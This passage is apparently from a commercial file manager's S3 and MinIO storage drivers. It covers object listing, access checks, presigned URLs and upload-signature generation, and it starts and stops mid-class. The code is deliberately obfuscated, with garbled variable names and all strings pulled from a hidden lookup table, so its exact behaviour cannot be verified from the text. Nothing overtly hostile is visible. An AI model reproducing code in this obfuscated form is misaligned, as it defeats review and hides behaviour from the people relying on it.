private function listObjs($æ­Ä¿ó‚, $Çù‰Ü»” = null, $§ä¿½Û¢ = null, $Ó’´ÛÛ = null) { $Ê¬î¶¿³ =& $_SERVER[¤øïŠ‹²]; $æ­Ä¿ó‚ = trim($æ­Ä¿ó‚, $Ê¬î¶¿³[8]); $ÉÍñ¿Ãğ = empty($æ­Ä¿ó‚) && $æ­Ä¿ó‚ !== $Ê¬î¶¿³[241] ? $Ê¬î¶¿³[12] : $æ­Ä¿ó‚ . $Ê¬î¶¿³[8]; return $this->client->getBucket($this->bucket, $ÉÍñ¿Ãğ, $Çù‰Ü»”, $§ä¿½Û¢, $Ó’´ÛÛ, !0); } public function has($ßæ¶Ëß“, $ñ÷¾Ã = false, $¥Ñ¸û§ñ = true) { $ùÖ¥Ä¡ =& $_SERVER[¤øïŠ‹²]; $ßæ¶Ëß“ = trim($ßæ¶Ëß“, $ùÖ¥Ä¡[8]); $òğ³¸Ù = empty($ßæ¶Ëß“) && $ßæ¶Ëß“ !== $ùÖ¥Ä¡[241] ? $ùÖ¥Ä¡[12] : $ßæ¶Ëß“ . $ùÖ¥Ä¡[8]; $†åÏË€‡ = null; $úÎªòİ† = 500; $êÀÁğœÇ = $ùÖ¥Ä¡[8]; $ïìã¯—â = $ûû˜¦î¬ = array(); while (!0) { $¼şÓ¤Ô² = $this->listObjs($ßæ¶Ëß“, $†åÏË€‡, $úÎªòİ†, $êÀÁğœÇ); if (!$¼şÓ¤Ô²) { break; } $†åÏË€‡ = $¼şÓ¤Ô²[$ùÖ¥Ä¡[251]]; $öÁ²Øäñ = $¼şÓ¤Ô²[$ùÖ¥Ä¡[249]]; $¶Ñ¯÷æŸ = $¼şÓ¤Ô²[$ùÖ¥Ä¡[250]]; if (empty($öÁ²Øäñ) && empty($¶Ñ¯÷æŸ)) { break; } if (count($öÁ²Øäñ) == 1 && $öÁ²Øäñ[0][$ùÖ¥Ä¡[32]] == $òğ³¸Ù) { break; } if ($ñ÷¾Ã) { if (count($öÁ²Øäñ)) { $öÁ²Øäñ = array_column($öÁ²Øäñ, $ùÖ¥Ä¡[32]); $ïìã¯—â = array_merge($ïìã¯—â, $öÁ²Øäñ); } if (count($¶Ñ¯÷æŸ)) { $¶Ñ¯÷æŸ = array_column($¶Ñ¯÷æŸ, $ùÖ¥Ä¡[32]); $ûû˜¦î¬ = array_merge($ûû˜¦î¬, $¶Ñ¯÷æŸ); } if ($†åÏË€‡ === null) { break; } continue; } if ($¥Ñ¸û§ñ) { if (!empty($öÁ²Øäñ)) { if (count($öÁ²Øäñ) > 1 || isset($öÁ²Øäñ[0][$ùÖ¥Ä¡[32]]) && $öÁ²Øäñ[0][$ùÖ¥Ä¡[32]] != $òğ³¸Ù) { return !0; } } } else { if (!empty($¶Ñ¯÷æŸ)) { return !0; } } if ($†åÏË€‡ === null) { break; } } if ($ñ÷¾Ã) { $ïìã¯—â = array_diff($ïìã¯—â, array($òğ³¸Ù)); $ïìã¯—â = count(array_unique($ïìã¯—â)); $ûû˜¦î¬ = count(array_unique($ûû˜¦î¬)); return array($ùÖ¥Ä¡[252] => $ïìã¯—â, $ùÖ¥Ä¡[253] => $ûû˜¦î¬); } return !1; } public function listAll($Åä“–) { $™Ïü£óÉ =& $_SERVER[¤øïŠ‹²]; $óªÊ…îô = $this->fileList($Åä“–, $™Ïü£óÉ[12], !0); $…ïèôÇ¡ = array_to_keyvalue($óªÊ…îô[$™Ïü£óÉ[97]], $™Ïü£óÉ[32]); foreach ($óªÊ…îô[$™Ïü£óÉ[96]] as $Óò¼³”¶) { if (is_string($Óò¼³”¶)) { $…ïèôÇ¡[$Óò¼³”¶] = array($™Ïü£óÉ[90] => 0); } } return $this->listAllFiles($Åä“–, $…ïèôÇ¡); } public function canRead($§©ê„™ø) { $õ¬Êóµ =& $_SERVER[¤øïŠ‹²]; $ó™ıÔıç = $this->client->getAccessControlPolicy($this->bucket, $§©ê„™ø); if (!$ó™ıÔıç) { return !1; } return in_array($ó™ıÔıç, array($õ¬Êóµ[254], $õ¬Êóµ[255], $õ¬Êóµ[256])) ? !0 : !1; } public function canWrite($¦Ñµà¢“) { $“×Ú—¼ =& $_SERVER[¤øïŠ‹²]; $‚Áåéõ = $this->client->getAccessControlPolicy($this->bucket, $¦Ñµà¢“); if (!$‚Áåéõ) { return !1; } return in_array($‚Áåéõ, array($“×Ú—¼[254], $“×Ú—¼[255])) ? !0 : !1; } public function getContent($˜£å¬©) { return $this->client->getObject($this->bucket, $˜£å¬©); } public function setContent($ÊŠóÔİÂ, $½ş¨†€© = '', $ƒÀóıÑ• = false) { $‚ÈÉì”£ =& $_SERVER[¤øïŠ‹²]; $ÊŠóÔİÂ = $ƒÀóıÑ• ? trim($ÊŠóÔİÂ, $‚ÈÉì”£[8]) . $‚ÈÉì”£[8] : $ÊŠóÔİÂ; $‚¶ŠÂØè = get_file_mime(get_path_ext($ÊŠóÔİÂ)); $İÉ™ÅìÁ = $this->client->putObject($½ş¨†€©, $this->bucket, $ÊŠóÔİÂ, $‚ÈÉì”£[242], array(), $‚¶ŠÂØè); if (!$İÉ™ÅìÁ) { return !1; } if ($ƒÀóıÑ•) { return !0; } return $İÉ™ÅìÁ ? !0 : !1; } public function fileSubstr($”¹ÙûŸÒ, $œ„‡ĞËó, $ë¯‚ÔÂÍ) { $ÙèÃÌÑ = $œ„‡ĞËó + $ë¯‚ÔÂÍ - 1; return $this->client->getObject($this->bucket, $”¹ÙûŸÒ, array($_SERVER[¤øïŠ‹²][257] => "\142\171\164\x65\x73\75{$œ„‡ĞËó}\x2d{$ÙèÃÌÑ}")); } public function upload($ÔÜª£ø‘, $ø¼ìØ¬, $£¼°š‹æ = false, $€ÙÍ¹€¡ = REPEAT_REPLACE) { $ıû¸Ä‰¶ =& $_SERVER[¤øïŠ‹²]; if (!$ø¼ìØ¬ || !@file_exists($ø¼ìØ¬)) { return !1; } $•ÃïÒ­½ = array($ıû¸Ä‰¶[258] => @md5_file($ø¼ìØ¬)); $£ò°ïÌ = array($ıû¸Ä‰¶[259] => get_file_mime(get_path_ext($ÔÜª£ø‘))); if (IO::size($ø¼ìØ¬) <= 1024 * 1024 * 200) { $Î›…‡‹Å = $this->client->putObjectFile($ø¼ìØ¬, $this->bucket, $ÔÜª£ø‘, $ıû¸Ä‰¶[242], $•ÃïÒ­½, $£ò°ïÌ); return !empty($Î›…‡‹Å) ? $this->getPathOuter($ÔÜª£ø‘) : !1; } $ÅÁ©£î = $this->client->multiUploadObject($ø¼ìØ¬, $this->bucket, trim($ÔÜª£ø‘, $ıû¸Ä‰¶[8]), $•ÃïÒ­½, $£ò°ïÌ); return $ÅÁ©£î ? $this->getPathOuter($ÔÜª£ø‘) : !1; } public function download($› Ã–½¹, $à”‹­›») { if (!@is_dir($this->pathFather($à”‹­›»)) && !IO::mkdir($this->pathFather($à”‹­›»))) { return !1; } $Ú§µÓ¼İ = $this->client->getObject($this->bucket, $› Ã–½¹, array(), $à”‹­›»); return $Ú§µÓ¼İ !== !1 ? $à”‹­›» : !1; } public function link($Ú¸ÎˆÃ, $Óˆ³Âèˆ = array()) { return $this->getPreSignedURL($Ú¸ÎˆÃ, 3600 * 12, $Óˆ³Âèˆ); } private function getPreSignedURL($úÏ¤¢£, $ğ¥—Ç©, $·„²€ü = array(), $óş­­ˆæ = "\x47\x45\x54") { $Ş¨§¡½È =& $_SERVER[¤øïŠ‹²]; $úÏ¤¢£ = trim($úÏ¤¢£, $Ş¨§¡½È[8]); if ($this->signVer == $Ş¨§¡½È[260]) { return $this->client->getPreSignedV2URL($this->bucket, $úÏ¤¢£, $ğ¥—Ç©, $óş­­ˆæ, $·„²€ü); } return $this->client->getPreSignedV4URL($this->bucket, $úÏ¤¢£, $ğ¥—Ç©, array(), $óş­­ˆæ, $·„²€ü); } public function fileOut($Ö¢€ââŒ, $â¸Ÿù† = false, $’Œô¹²Æ = false, $¨Û´ÊÜÇ = '') { $ª¹æ®·· =& $_SERVER[¤øïŠ‹²]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ö¢€ââŒ, $â¸Ÿù†, $’Œô¹²Æ, $¨Û´ÊÜÇ); } if (!$’Œô¹²Æ) { $’Œô¹²Æ = $this->pathThis($Ö¢€ââŒ); } $ëş©ìÕÆ = get_file_mime(get_path_ext($’Œô¹²Æ)); if ($ëş©ìÕÆ == $ª¹æ®··[261]) { return parent::fileOut($Ö¢€ââŒ, $â¸Ÿù†, $’Œô¹²Æ, $¨Û´ÊÜÇ); } $€û¬»ä = array($ª¹æ®··[262] => $ëş©ìÕÆ); if ($â¸Ÿù†) { $€û¬»ä[$ª¹æ®··[263]] = $ª¹æ®··[264] . rawurlencode($’Œô¹²Æ); } else { } $Ìôè÷İÖ = $this->link($Ö¢€ââŒ, $€û¬»ä); $this->fileOutLink($Ìôè÷İÖ); } public function fileOutServer($ÀåÏÌó›, $Óì±ªÔ× = false, $ã€ÇÌÈ¨ = false, $²ÙåÎ¼Ò = '') { parent::fileOut($ÀåÏÌó›, $Óì±ªÔ×, $ã€ÇÌÈ¨, $²ÙåÎ¼Ò); } public function fileOutImageServer($°›™…Ê, $±ÚÕ“®ú = 250) { parent::fileOutImage($°›™…Ê, $±ÚÕ“®ú); } public function fileOutLink($¯›®×êä) { $éœ´Ãİ‹ =& $_SERVER[¤øïŠ‹²]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($éœ´Ãİ‹[78], $éœ´Ãİ‹[77], $éœ´Ãİ‹[79])) && !get_url_scheme($this->endpoint) && substr($¯›®×êä, 0, 7) == $éœ´Ãİ‹[229]) { $¯›®×êä = $éœ´Ãİ‹[230] . substr($¯›®×êä, 7); } header($éœ´Ãİ‹[185] . $¯›®×êä); die; } public function hashMd5($ø´­î, $¹Û‰ÂÍ” = '') { $¥•Ùè = $this->objectMeta($ø´­î); if (!$¥•Ùè) { return !1; } $¹Û‰ÂÍ” = $¹Û‰ÂÍ” ? $¹Û‰ÂÍ” : _get($¥•Ùè, $_SERVER[¤øïŠ‹²][265]); return $¹Û‰ÂÍ”; } public function uploadFormData($Øıí™Ğ, $à·åä• = 3600) { $Î‰ÑËƒÚ =& $_SERVER[¤øïŠ‹²]; if (!$this->_isClientAsync()) { $®í÷Ø‡¡ = $this->getPreSignedURL($Øıí™Ğ, $à·åä•, array(), $Î‰ÑËƒÚ[266]); return array($Î‰ÑËƒÚ[219] => str_replace($Î‰ÑËƒÚ[229], $Î‰ÑËƒÚ[267], $®í÷Ø‡¡)); } if (isset($GLOBALS[$Î‰ÑËƒÚ[6]][$Î‰ÑËƒÚ[103]][$Î‰ÑËƒÚ[268]]) && $GLOBALS[$Î‰ÑËƒÚ[6]][$Î‰ÑËƒÚ[103]][$Î‰ÑËƒÚ[268]] == $Î‰ÑËƒÚ[241]) { return $this->uploadMultiData($Øıí™Ğ, $à·åä•); } if ($this->signVer == $Î‰ÑËƒÚ[260]) { return $this->uploadFormDataV2($Øıí™Ğ, $à·åä•); } return $this->uploadFormDataV4($Øıí™Ğ, $à·åä•); } public function uploadFormDataV2($ƒ£ù‰Ÿ, $ìŠûãÍè = 3600) { $…Ô­šÌ˜ =& $_SERVER[¤øïŠ‹²]; $ÄÛº¢ô = $this->pathFather($ƒ£ù‰Ÿ); $àæ’óã§ = $this->client->getHttpUploadPostParams($this->bucket, $ÄÛº¢ô, $…Ô­šÌ˜[242], $ìŠûãÍè); $Å¿ıüÁÎ = array_merge((array) $àæ’óã§, array($…Ô­šÌ˜[269] => $…Ô­šÌ˜[260], $…Ô­šÌ˜[219] => $this->getHost())); if ($this->_isClientAsync()) { unset($Å¿ıüÁÎ[$…Ô­šÌ˜[269]]); } return $Å¿ıüÁÎ; } public function uploadFormDataV4($ì¸ ¨ÜĞ, $£‹âéÇÖ = 3600) { $ûıËûáı =& $_SERVER[¤øïŠ‹²]; $¬‹â¦°Ï = $ûıËûáı[242]; $®“Û‹§Œ = $ûıËûáı[270]; $ÕÃ¾õĞë = $ûıËûáı[73]; $á›ÛŠĞ = gmdate($ûıËûáı[271]); $¡éÍØÊ = gmdate($ûıËûáı[272]); $Å½—¨ı = $ûıËûáı[273]; $¿†¿ëÏ§ = $£‹âéÇÖ . $ûıËûáı[12]; $¤€‹Ü®õ = $ûıËûáı[274]; $æİÛõã = array($this->accessKey, $¡éÍØÊ, $this->region, $ÕÃ¾õĞë, $Å½—¨ı); $ñ…´ø¸ = implode($ûıËûáı[8], $æİÛõã); $¿À¶ˆ = array($ûıËûáı[275] => gmdate($ûıËûáı[276], strtotime($ûıËûáı[277])), $ûıËûáı[278] => array(array($ûıËûáı[279] => $this->bucket), array($ûıËûáı[280], $ûıËûáı[281], $ûıËûáı[12]), array($ûıËûáı[280], $ûıËûáı[282], $ûıËûáı[12]), array($ûıËûáı[283] => $¤€‹Ü®õ), array($ûıËûáı[284] => $ñ…´ø¸), array($ûıËûáı[285] => $®“Û‹§Œ), array($ûıËûáı[286] => $á›ÛŠĞ), array($ûıËûáı[287] => $¿†¿ëÏ§))); $ª×›—‚ = base64_encode(json_encode($¿À¶ˆ)); $®ìÆÑİ = hash_hmac($ûıËûáı[288], $¡éÍØÊ, $ûıËûáı[289] . $this->secret, !0); $¼ğ“’“× = hash_hmac($ûıËûáı[288], $this->region, $®ìÆÑİ, !0); $»ö’÷Ïé = hash_hmac($ûıËûáı[288], $ÕÃ¾õĞë, $¼ğ“’“×, !0); $ÆªÂú¾º = hash_hmac($ûıËûáı[288], $Å½—¨ı, $»ö’÷Ïé, !0); $®¨†êæ = hash_hmac($ûıËûáı[288], $ª×›—‚, $ÆªÂú¾º); $êÏÆ”üç = array($ûıËûáı[259] => $ûıËûáı[12], $ûıËûáı[283] => $¤€‹Ü®õ, $ûıËûáı[290] => $ª×›—‚, $ûıËûáı[284] => $ñ…´ø¸, $ûıËûáı[285] => $®“Û‹§Œ, $ûıËûáı[286] => $á›ÛŠĞ, $ûıËûáı[287] => $¿†¿ëÏ§, $ûıËûáı[291] => $®¨†êæ, $ûıËûáı[269] => $ûıËûáı[260], $ûıËûáı[219] => $this->getHost()); if ($this->_isClientAsync()) { unset($êÏÆ”üç[$ûıËûáı[269]]); } return $êÏÆ”üç; } public function uploadMultiData($Ä˜„›©ô, $şĞ½±»Ë = 3600) { $Ñ¨ğ äø =& $_SERVER[¤øïŠ‹²]; $åº’êÆ† = $this->signVer == $Ñ¨ğ äø[260] ? gmdate($Ñ¨ğ äø[292]) : gmdate($Ñ¨ğ äø[293]); $«ìÁıë¯ = array(); $™ôß‹¥ = $this->client->getUploadId($this->bucket, $Ä˜„›©ô, $«ìÁıë¯); if (!$™ôß‹¥) { return !1; } $‹ïíÙ¡¿ = array($Ñ¨ğ äø[294] => $™ôß‹¥, $Ñ¨ğ äø[219] => $this->getHost() . $Ñ¨ğ äø[8] . $this->pathEncode($Ä˜„›©ô), $Ñ¨ğ äø[295] => $åº’êÆ†, $Ñ¨ğ äø[106] => $Ä˜„›©ô, $Ñ¨ğ äø[269] => $this->signVer); if ($this->_isClientAsync()) { unset($‹ïíÙ¡¿[$Ñ¨ğ äø[269]]); } return $‹ïíÙ¡¿; } public function uploadMultiAuth($™¸’Î›ø, $É•İĞ = array()) { $Æµ‘ú©Ë =& $_SERVER[¤øïŠ‹²]; if ($this->signVer == $Æµ‘ú©Ë[260]) { if (isset($É•İĞ[$Æµ‘ú©Ë[296]])) { return $this->uploadPartAuthV2($™¸’Î›ø, $É•İĞ); } return $this->uploadListAuthV2($™¸’Î›ø, $É•İĞ); } if (isset($É•İĞ[$Æµ‘ú©Ë[296]])) { return $this->uploadPartAuthV4($™¸’Î›ø, $É•İĞ); } return $this->uploadListAuthV4($™¸’Î›ø, $É•İĞ); } public function uploadPartAuthV2($ò­³™Ğİ, $Öâ¼¼Š‡ = array()) { $ÎÍşŸ Ó =& $_SERVER[¤øïŠ‹²]; $ä•ŞÒÊá = $Öâ¼¼Š‡[$ÎÍşŸ Ó[106]]; $¨Ì¡ÛÖ¡ = gmdate($ÎÍşŸ Ó[292]); $¯Òæ¾âÁ = array_intersect_key($Öâ¼¼Š‡, array_flip(array($ÎÍşŸ Ó[296], $ÎÍşŸ Ó[294]))); ksort($¯Òæ¾âÁ); $…Õïô÷ = $¯Òæ¾âÁ ? $ÎÍşŸ Ó[87] . http_build_query($¯Òæ¾âÁ, null, $ÎÍşŸ Ó[297], PHP_QUERY_RFC3986) : $ÎÍşŸ Ó[12]; $Æ¸ÈÇ‰ì = array($ÎÍşŸ Ó[266], $ÎÍşŸ Ó[12], $ÎÍşŸ Ó[132], $ÎÍşŸ Ó[12], "\170\55\x61\155\x7a\x2d\144\x61\x74\145\72{$¨Ì¡ÛÖ¡}", $ÎÍşŸ Ó[8] . $this->bucket . $ÎÍşŸ Ó[8] . $this->pathEncode($ä•ŞÒÊá) . $…Õïô÷); $Ÿèæ©âà = implode($ÎÍşŸ Ó[59], $Æ¸ÈÇ‰ì); $¶¥¨ÅÃÉ = $this->client->__getSignature($Ÿèæ©âà); return array($ÎÍşŸ Ó[298] => $¶¥¨ÅÃÉ, $ÎÍşŸ Ó[295] => $¨Ì¡ÛÖ¡); } public function uploadListAuthV2($Ó ¥ÈèÍ, $…šÜÉ½ï = array()) { $Ì¿‚Ò¼Š =& $_SERVER[¤øïŠ‹²]; $Ø…²ÊÏó = $…šÜÉ½ï[$Ì¿‚Ò¼Š[106]]; $“Ê–Ã„² = $…šÜÉ½ï[$Ì¿‚Ò¼Š[294]]; $ ô¸íóç = $this->client->listParts($this->bucket, $Ø…²ÊÏó, $“Ê–Ã„²); if (!$ ô¸íóç) { return !1; } $³™šÍ€ = gmdate($Ì¿‚Ò¼Š[292]); $Û÷ã¹ñï = $Ì¿‚Ò¼Š[299] . $“Ê–Ã„²; $ÁŞ½“‘™ = array($Ì¿‚Ò¼Š[300], $Ì¿‚Ò¼Š[12], $Ì¿‚Ò¼Š[132], $Ì¿‚Ò¼Š[12], "\x78\x2d\x61\x6d\x7a\x2d\144\141\164\x65\72{$³™šÍ€}", $Ì¿‚Ò¼Š[8] . $this->bucket . $Ì¿‚Ò¼Š[8] . $this->pathEncode($Ø…²ÊÏó) . $Û÷ã¹ñï); $•˜Áô¼Õ = implode($Ì¿‚Ò¼Š[59], $ÁŞ½“‘™); $ó¡ª–‰§ = $this->client->__getSignature($•˜Áô¼Õ); return array($Ì¿‚Ò¼Š[298] => $ó¡ª–‰§, $Ì¿‚Ò¼Š[295] => $³™šÍ€, $Ì¿‚Ò¼Š[301] => $ ô¸íóç); } public function uploadPartAuthV4($ïÕ§®ÃÓ, $ÒÏïØÎ¶ = array()) { $ôÏÁ†œş =& $_SERVER[¤øïŠ‹²]; $äéİéØß = $ÒÏïØÎ¶[$ôÏÁ†œş[106]]; $Ø§¤÷âı = array($ôÏÁ†œş[286] => gmdate($ôÏÁ†œş[293]), $ôÏÁ†œş[302] => _get($ÒÏïØÎ¶, $ôÏÁ†œş[303], hash($ôÏÁ†œş[288], $ôÏÁ†œş[12]))); $ä’ƒûíö = explode($ôÏÁ†œş[221], $this->getHost()); $²îåÛå¡ = array($ôÏÁ†œş[304] => $ä’ƒûíö[1], $ôÏÁ†œş[305] => $ôÏÁ†œş[12], $ôÏÁ†œş[259] => $ôÏÁ†œş[132], $ôÏÁ†œş[306] => $ÒÏïØÎ¶[$ôÏÁ†œş[90]]); $–œ§°Àî = $ôÏÁ†œş[266]; $ºØ±‚·ñ = $ôÏÁ†œş[8] . $this->pathEncode($äéİéØß); $¦ıÄ¿‹Ï = array_intersect_key($ÒÏïØÎ¶, array_flip(array($ôÏÁ†œş[296], $ôÏÁ†œş[294]))); $ìÜÉ× = $this->client->__getSignatureV4($Ø§¤÷âı, $²îåÛå¡, $–œ§°Àî, $ºØ±‚·ñ, $¦ıÄ¿‹Ï); return array($ôÏÁ†œş[298] => $ìÜÉ×, $ôÏÁ†œş[302] => $Ø§¤÷âı[$ôÏÁ†œş[302]], $ôÏÁ†œş[295] => $Ø§¤÷âı[$ôÏÁ†œş[286]]); } public function uploadListAuthV4($èä‡ƒ, $ìæ…©¾ú = array()) { $Ûé·è±Í =& $_SERVER[¤øïŠ‹²]; $ªµ‚è¢ = $ìæ…©¾ú[$Ûé·è±Í[106]]; $Ÿùí´¶» = $ìæ…©¾ú[$Ûé·è±Í[294]]; $÷¦£­áã = $this->client->listParts($this->bucket, $ªµ‚è¢, $Ÿùí´¶»); if (!$÷¦£­áã) { return !1; } $¼ë¯ûæ“ = $Ûé·è±Í[307]; foreach ($÷¦£­áã as $ÃŞ—¶§ë) { $¼ë¯ûæ“ .= $Ûé·è±Í[308] . "\x3c\x50\141\162\164\116\x75\x6d\142\145\x72\76{$ÃŞ—¶§ë[$Ûé·è±Í[309]]}\x3c\x2f\120\141\x72\x74\x4e\x75\x6d\x62\x65\162\76\xa" . "\x3c\x45\x54\141\x67\76{$ÃŞ—¶§ë[$Ûé·è±Í[310]]}\74\57\x45\x54\x61\147\76\xa" . $Ûé·è±Í[311]; } $¼ë¯ûæ“ .= $Ûé·è±Í[312]; $‰“ÌÕ‚ó = array($Ûé·è±Í[286] => gmdate($Ûé·è±Í[293]), $Ûé·è±Í[302] => hash($Ûé·è±Í[288], $¼ë¯ûæ“)); $ÎşÚë¶ = explode($Ûé·è±Í[221], $this->getHost()); $š½Î÷¼« = array($Ûé·è±Í[304] => $ÎşÚë¶[1], $Ûé·è±Í[259] => $Ûé·è±Í[132], $Ûé·è±Í[306] => strlen($¼ë¯ûæ“)); $ÏáÉı¾ = $Ûé·è±Í[300]; $ÁùÛĞ«á = $Ûé·è±Í[8] . $this->pathEncode($ªµ‚è¢); $ÙŞ‘ÉŒØ = array($Ûé·è±Í[294] => $Ÿùí´¶»); $û¥“²Àâ = $this->client->__getSignatureV4($‰“ÌÕ‚ó, $š½Î÷¼«, $ÏáÉı¾, $ÁùÛĞ«á, $ÙŞ‘ÉŒØ); return array($Ûé·è±Í[298] => $û¥“²Àâ, $Ûé·è±Í[302] => $‰“ÌÕ‚ó[$Ûé·è±Í[302]], $Ûé·è±Í[295] => $‰“ÌÕ‚ó[$Ûé·è±Í[286]], $Ûé·è±Í[301] => $÷¦£­áã); } private function _isClientAsync() { $¿³‘ÛÊ› =& $_SERVER[¤øïŠ‹²]; static $ÎÖ»†ªÏ = null; if ($ÎÖ»†ªÏ === null) { $•‹îŠ£Ğ = isset($_REQUEST[$¿³‘ÛÊ›[313]]) ? json_decode($_REQUEST[$¿³‘ÛÊ›[313]], !0) : !1; $ÎÖ»†ªÏ = $•‹îŠ£Ğ && _get($•‹îŠ£Ğ, $¿³‘ÛÊ›[314]) == $¿³‘ÛÊ›[315]; } return $ÎÖ»†ªÏ; } public function getHost() { $âºşÀ¿í =& $_SERVER[¤øïŠ‹²]; $¸¤—÷¥ˆ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($âºşÀ¿í[81], $âºşÀ¿í[75], $âºşÀ¿í[80], $âºşÀ¿í[73]))) { return $¸¤—÷¥ˆ . $âºşÀ¿í[8] . $this->bucket; } if ($this->osType == $âºşÀ¿í[73] && !is_domain($¸¤—÷¥ˆ)) { return $¸¤—÷¥ˆ . $âºşÀ¿í[8] . $this->bucket; } $¸¤—÷¥ˆ = explode($âºşÀ¿í[221], $¸¤—÷¥ˆ); return $¸¤—÷¥ˆ[0] . $âºşÀ¿í[221] . $this->bucket . $âºşÀ¿í[10] . $¸¤—÷¥ˆ[1]; } public function size($¤üèÉÜ) { $ìº·„«˜ = $this->objectMeta($¤üèÉÜ); return $ìº·„«˜ ? $ìº·„«˜[$_SERVER[¤øïŠ‹²][90]] : 0; } public function info($­æ‰Ü­À) { if ($this->isFolder($­æ‰Ü­À)) { return $this->folderInfo($­æ‰Ü­À); } else { if ($this->isFile($­æ‰Ü­À)) { return $this->fileInfo($­æ‰Ü­À); } } return !1; } public function exist($¼µ–‚ãÅ) { return $this->isFile($¼µ–‚ãÅ) || $this->isFolder($¼µ–‚ãÅ); } public function isFile($Íè…¿) { return !$this->isFolder($Íè…¿) && $this->objectMeta($Íè…¿); } public function isFolder($æäËñ“ù) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][190], $æäËñ“ù); } protected function objectMeta($êüìÖ²) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][192], $êüìÖ²); } protected function _objectMeta($‰ÜÌ²Ûø) { $³ñØ×‘ =& $_SERVER[¤øïŠ‹²]; $‰ÜÌ²Ûø = rtrim($‰ÜÌ²Ûø, $³ñØ×‘[8]); try { $ıÎ×½€§ = $this->client->getObjectInfo($this->bucket, $‰ÜÌ²Ûø); if (!isset($ıÎ×½€§[$³ñØ×‘[265]]) && isset($ıÎ×½€§[$³ñØ×‘[316]])) { $ıÎ×½€§[$³ñØ×‘[265]] = $ıÎ×½€§[$³ñØ×‘[316]]; } } catch (Exception $áÍÛà®) { $ıÎ×½€§ = !1; } if (!$ıÎ×½€§) { } return $ıÎ×½€§; } protected function _isFolder($Äµêğ®Ù) { $¶ÊøÖ¥€ =& $_SERVER[¤øïŠ‹²]; $Äµêğ®Ù = rtrim($Äµêğ®Ù, $¶ÊøÖ¥€[8]) . $¶ÊøÖ¥€[8]; if ($Äµêğ®Ù == $¶ÊøÖ¥€[12] || $Äµêğ®Ù == $¶ÊøÖ¥€[8]) { return !0; } $ªÇƒõÆ¥ = $this->client->getBucket($this->bucket, $Äµêğ®Ù, null, 1); if (empty($ªÇƒõÆ¥[$¶ÊøÖ¥€[249]])) { return !1; } $áÀ²²¬ñ = $ªÇƒõÆ¥[$¶ÊøÖ¥€[249]][0][$¶ÊøÖ¥€[32]]; return stripos($áÀ²²¬ñ, $Äµêğ®Ù) === 0 ? !0 : !1; if (substr($áÀ²²¬ñ, -1) == $¶ÊøÖ¥€[8]) { return !0; } if (get_path_this($áÀ²²¬ñ) == get_path_this($Äµêğ®Ù)) { return !1; } return !0; } public function listObject($ã¸Òßàº) { return $this->fileList($ã¸Òßàº, $_SERVER[¤øïŠ‹²][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($î¥³Û„¾) { $µñæ›²Ì =& $_SERVER[¤øïŠ‹²]; parent::__construct($î¥³Û„¾); $this->setSignVersion($µñæ›²Ì[260]); if (!$this->region) { $this->region = $µñæ›²Ì[317]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÅŸ®í†Ë = $this->getBktRegion(); return $this->region == $ÅŸ®í†Ë ? !0 : !1; } public function uploadFormData($„‡‡ùÏ©, $À¯É»¢¿ = 3600) { $»™á»Ìƒ =& $_SERVER[¤øïŠ‹²]; $öˆœ¨Å¦ = $»™á»Ìƒ[242]; $õ¾¯ƒÇ· = $»™á»Ìƒ[270]; $’§àÆõ› = $»™á»Ìƒ[73]; $ùÈ´†Æâ = gmdate($»™á»Ìƒ[271]); $»ºÜ¯•Â = gmdate($»™á»Ìƒ[272]); $àÒ£Ş = $»™á»Ìƒ[273]; $ÎÏ˜ø¤û = $À¯É»¢¿ . $»™á»Ìƒ[12]; $áÒ±¹¨µ = $»™á»Ìƒ[274]; $êĞ²ÛÉ = array($this->accessKey, $»ºÜ¯•Â, $this->region, $’§àÆõ›, $àÒ£Ş); $Ğ…Ëì = implode($»™á»Ìƒ[8], $êĞ²ÛÉ); $¡’òìÆÕ = array($»™á»Ìƒ[275] => gmdate($»™á»Ìƒ[276], strtotime($»™á»Ìƒ[277])), $»™á»Ìƒ[278] => array(array($»™á»Ìƒ[279] => $this->bucket), array($»™á»Ìƒ[318] => $öˆœ¨Å¦), array($»™á»Ìƒ[280], $»™á»Ìƒ[281], $»™á»Ìƒ[12]), array($»™á»Ìƒ[280], $»™á»Ìƒ[282], $»™á»Ìƒ[12]), array($»™á»Ìƒ[280], $»™á»Ìƒ[319], $»™á»Ìƒ[12]), array($»™á»Ìƒ[283] => $áÒ±¹¨µ), array($»™á»Ìƒ[284] => $Ğ…Ëì), array($»™á»Ìƒ[285] => $õ¾¯ƒÇ·), array($»™á»Ìƒ[286] => $ùÈ´†Æâ), array($»™á»Ìƒ[287] => $ÎÏ˜ø¤û))); $ˆ¡ÔñÛ = base64_encode(json_encode($¡’òìÆÕ)); $÷ä£êğŞ = hash_hmac($»™á»Ìƒ[288], $»ºÜ¯•Â, $»™á»Ìƒ[289] . $this->secret, !0); $ë®ššÅ = hash_hmac($»™á»Ìƒ[288], $this->region, $÷ä£êğŞ, !0); $òüµ”Áè = hash_hmac($»™á»Ìƒ[288], $’§àÆõ›, $ë®ššÅ, !0); $àü‡ÂÜ“ = hash_hmac($»™á»Ìƒ[288], $àÒ£Ş, $òüµ”Áè, !0); $«æ…å” = hash_hmac($»™á»Ìƒ[288], $ˆ¡ÔñÛ, $àü‡ÂÜ“); $Õº¦€Ñ† = array($»™á»Ìƒ[259] => $»™á»Ìƒ[12], $»™á»Ìƒ[306] => $»™á»Ìƒ[12], $»™á»Ìƒ[318] => $öˆœ¨Å¦, $»™á»Ìƒ[283] => $áÒ±¹¨µ, $»™á»Ìƒ[290] => $ˆ¡ÔñÛ, $»™á»Ìƒ[320] => $Ğ…Ëì, $»™á»Ìƒ[321] => $õ¾¯ƒÇ·, $»™á»Ìƒ[322] => $ùÈ´†Æâ, $»™á»Ìƒ[323] => $ÎÏ˜ø¤û, $»™á»Ìƒ[324] => $«æ…å”, $»™á»Ìƒ[219] => $this->getHost()); return $Õº¦€Ñ†; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¦Îşœ´) { $öäµ›‰ =& $_SERVER[¤øïŠ‹²]; parent::__construct($¦Îşœ´); 